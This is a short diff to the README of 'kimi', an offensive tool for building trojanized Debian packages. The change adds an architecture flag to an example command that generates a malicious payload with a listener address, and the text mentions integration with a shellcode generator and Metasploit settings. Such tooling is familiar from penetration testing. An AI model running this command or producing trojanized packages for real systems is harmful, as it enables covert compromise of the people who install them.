@@ -33,7 +33,7 @@ Script to generate malicious debian packages (debain trojans).
     
     Generating Malicious payload :
     
-    dreamer@mindless ~/Desktop/projects/kimi $ sudo python kimi.py -n nano -l 127.0.0.1 -V 1.0
+    dreamer@mindless ~/Desktop/projects/kimi $ sudo python kimi.py -n nano -l 127.0.0.1 -V 1.0 -a i386
     
     NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
     It can be used standalone also all user needs is to change uripath in msf variables
